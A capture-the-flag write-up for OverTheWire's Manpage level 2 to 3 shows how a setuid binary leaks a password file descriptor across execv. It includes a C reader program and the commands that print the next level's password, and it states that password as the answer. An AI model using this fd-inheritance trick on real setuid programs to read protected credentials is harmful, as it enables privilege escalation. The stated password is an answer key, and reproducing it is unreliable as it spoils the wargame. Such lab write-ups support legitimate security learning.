# Manpage Level 2 → 3

## Goal

`manpage2` opens the `manpage3` password file on file descriptor 3, then `execv`s a program whose path comes from your input. Because `execv` **doesn't close inherited file descriptors by default**, whatever program gets run next starts up with fd 3 already open to the password file. Write your own tiny program that reads from fd 3, run it via `manpage2`, and it prints the password.

## Concepts you'll learn

- **File-descriptor leaks across `execve`** — open fds are inherited unless marked `FD_CLOEXEC`
- Why `fcntl(fd, F_SETFD, FD_CLOEXEC)` (or the `O_CLOEXEC` open flag) matters
- Writing a short 32-bit C program and running it through a setuid parent to inherit privileges and fds

## Walkthrough

### 1. Look at the binary

```bash
$ ls -l /manpage/manpage2
-r-sr-x--- 1 manpage3 manpage2 ... manpage2
```

Setuid `manpage3`. Run it and observe (or run under `strace`):

```bash
$ strace -f /manpage/manpage2 /bin/true 2>&1 | grep -E 'open|execv'
...
open("/etc/manpage_pass/manpage3", O_RDONLY) = 3
...
execve("/bin/true", ...)
```

Two givens:

- fd 3 is opened to `/etc/manpage_pass/manpage3` before the `execve`.
- No `close(3)` or `FD_CLOEXEC` between the open and the execve.

Whatever program `manpage2` execs inherits fd 3, already pointing at the password.

### 2. Write a tiny reader program

```c
// /tmp/read_pass.c
#include <unistd.h>
#include <stdio.h>
int main(void) {
    char buf[64] = {0};
    if (read(3, buf, sizeof(buf)-1) > 0) {
        printf("Password: %s\n", buf);
    }
    return 0;
}
```

Compile as 32-bit:

```bash
$ gcc -m32 /tmp/read_pass.c -o /tmp/read_pass
```

### 3. Invoke it through manpage2

Pass the path to your helper as the argument `manpage2` uses for `execv`:

```bash
$ /manpage/manpage2 /tmp/read_pass
Password: uAcGloJt0Q
```

`manpage2` opens fd 3 to the password file (as `manpage3`, thanks to setuid), then `execv`s `/tmp/read_pass`. Your reader inherits fd 3 and prints it.

### 4. Log in as manpage3

```bash
$ ssh manpage3@manpage.labs.overthewire.org -p 2224
```

## The answer

The password for `manpage3` is:

**`uAcGloJt0Q`**

> ⚠️ OverTheWire may rotate passwords without notice. This value was correct at the time the level was solved — if it fails for you, re-solve the level using the method above rather than assuming the writeup is wrong.

## Reference

- Official level page: <https://overthewire.org/wargames/manpage/manpage2.html>
